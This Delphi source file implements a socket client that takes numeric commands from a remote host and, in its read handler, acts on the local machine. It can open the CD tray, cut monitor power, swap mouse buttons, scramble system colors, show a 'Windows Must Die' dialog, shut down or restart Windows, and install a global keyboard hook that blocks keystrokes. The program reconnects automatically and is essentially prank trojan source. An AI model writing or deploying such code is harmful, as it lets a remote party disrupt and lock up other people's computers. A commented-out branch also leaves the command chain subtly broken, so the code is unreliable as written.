unit Main;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, System.Win.ScktComp, Vcl.StdCtrls,
  Vcl.Buttons, Vcl.ComCtrls, Vcl.ExtCtrls;

type
  TUMain = class(TForm)
    Edt_Host: TEdit;
    Label1: TLabel;
    Btn_Start: TBitBtn;
    Edt_Port: TEdit;
    Label2: TLabel;
    Client_Sock: TClientSocket;
    StatusBar_APP: TStatusBar;
    TAuto_Reconn: TTimer;
    Auto_Reconn_Chek: TCheckBox;
    procedure Btn_StartClick(Sender: TObject);
    procedure Client_SockConnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure Client_SockDisconnect(Sender: TObject; Socket: TCustomWinSocket);
    procedure Client_SockRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure Client_SockError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure Client_SockConnecting(Sender: TObject; Socket: TCustomWinSocket);
    procedure FormDestroy(Sender: TObject);
    procedure TAuto_ReconnTimer(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  UMain: TUMain;
  KS: TKeyboardState;
  Old_Keyboard_Hook: HHook = 0;
  Dummy: integer = 0;

implementation

uses
  Winapi.MMSystem, Vcl.Dialogs ;

const
  SysColorArray: array [0..13] of Integer =
  (COLOR_ACTIVEBORDER, COLOR_ACTIVECAPTION, COLOR_APPWORKSPACE, COLOR_BACKGROUND,
  COLOR_BTNFACE, COLOR_BTNTEXT, COLOR_CAPTIONTEXT, COLOR_INACTIVEBORDER,
  COLOR_INFOTEXT, COLOR_MENU, COLOR_MENUTEXT, COLOR_WINDOW, COLOR_WINDOWFRAME,
  COLOR_WINDOWTEXT);
//===============
  ColorArray: array [0..12] of Integer =  //Colors are stored in the Graphics.pas module
     (16776960, 0, 16711680, 65535, 16711935, 32768, 8388608, 255, 12632256, 16777215, 15780518, 128, 32896);

{$R *.dfm}

procedure TUMain.Btn_StartClick(Sender: TObject);
begin
 with Btn_Start do
  begin
    case Tag of
      0: begin
           Client_Sock.Port   := StrToInt(Edt_Port.Text);
           Client_Sock.Host   := (Edt_Host.Text);
           Client_Sock.Active := True;
           Caption := 'Stop Client !';
           Tag := 1;
           Edt_Port.Enabled:= False;
           Edt_Host.Enabled:= False;
      end;
      1: begin
           Client_Sock.Active := False;
           Caption := 'Start Client';
           Tag := 0;
           Edt_Port.Enabled:= True;
           Edt_Host.Enabled:= True;
      end;
    end;
  end;
//=============
 if Auto_Reconn_Chek.Checked then
   TAuto_Reconn.Enabled := True
 else
   TAuto_Reconn.Enabled := False;
end;

procedure TUMain.Client_SockConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  StatusBar_APP.Panels.Items[1].Text := 'Client is Activated ,Connections on the IP: ' +Socket.RemoteAddress ;
  Btn_Start.Enabled:= True;
end;

procedure TUMain.Client_SockConnecting(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  StatusBar_APP.Panels.Items[1].Text := 'Connecting...';
  Btn_Start.Enabled:= False;
end;

Function KbHook( code: Integer; wparam: Word; lparam: LongInt ): LongInt; stdcall;
begin
  if code < 0 then Result := CallNextHookEx(Old_Keyboard_Hook, code, wparam, lparam )
  else Result := 1;
end;

procedure TUMain.Client_SockDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
  StatusBar_APP.Panels.Items[1].Text := 'Client is Stopped';
//==========
  Btn_Start.Caption := 'Start Client';
  Edt_Port.Enabled:= True;
  Edt_Host.Enabled:= True;
  Btn_Start.Tag := 0;
end;

procedure TUMain.Client_SockError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
begin
  ErrorCode := 0;
  StatusBar_APP.Panels.Items[1].Text := 'Connection Error !!';
//==========
  Btn_Start.Enabled:= True;
  Btn_Start.Caption := 'Start Client';
  Edt_Port.Enabled:= True;
  Edt_Host.Enabled:= True;
  Btn_Start.Tag := 0;
end;

procedure TUMain.Client_SockRead(Sender: TObject; Socket: TCustomWinSocket);
var  StrCommand : string;
begin
  StrCommand := Socket.ReceiveText;
//=======
  if StrCommand = '22' then
  begin
    Client_Sock.Active := False;
  end;
//=======

{$REGION '...'}
  if StrCommand = '0' then
    mciSendString('Set cdaudio door open wait', nil, 0, handle)
  else if StrCommand = '1' then
    mciSendString('Set cdaudio door closed wait', nil, 0, handle)
  else if StrCommand = '2' then
        SendMessage(Application.Handle, wm_SysCommand, SC_MonitorPower, 2)
  else   if
    StrCommand = '3' then  begin
        GetKeyboardState(KS);
        KS[020] := KS[020] xor 1;
        KS[144] := KS[144] xor 1;
        KS[145] := KS[145] xor 1;
        SetKeyboardstate(KS);
   end
  else if StrCommand = '4' then
        SwapMouseButton(True)
  else if StrCommand = '5' then
        Swapmousebutton(False)
  else if StrCommand = '6' then
        SetSysColors(1, SysColorArray[random(13)], ColorArray[random(12)])
  else if StrCommand = '7' then
        MessageDlg('Windows Must Die !!!', mtError, [mbOk],0)
  else if StrCommand = '8' then
        ExitWindowsEx(EWX_SHUTDOWN,0)
  else if StrCommand= '9' then
     //   ExitWindowsEx(EWX_FORCE,0)
  else if StrCommand = '10' then
        ExitWindows(EW_RestartWindows, 0)
  else if StrCommand = '11' then begin
        SystemParametersInfo(SPI_SETFASTTASKSWITCH, 1, @Dummy, 0);
        SystemParametersInfo(SPI_SCREENSAVERRUNNING, 1, @Dummy, 0);
        Old_Keyboard_Hook := SetWindowsHookEx(WH_KEYBOARD, @KbHook, HInstance, 0 );
  end;
{$ENDREGION}


end;

procedure TUMain.FormDestroy(Sender: TObject);
begin
  Client_Sock.Active := False;
end;

procedure TUMain.TAuto_ReconnTimer(Sender: TObject);
begin
 if not Client_Sock.Active then
    Client_Sock.Active := True;
end;



end.
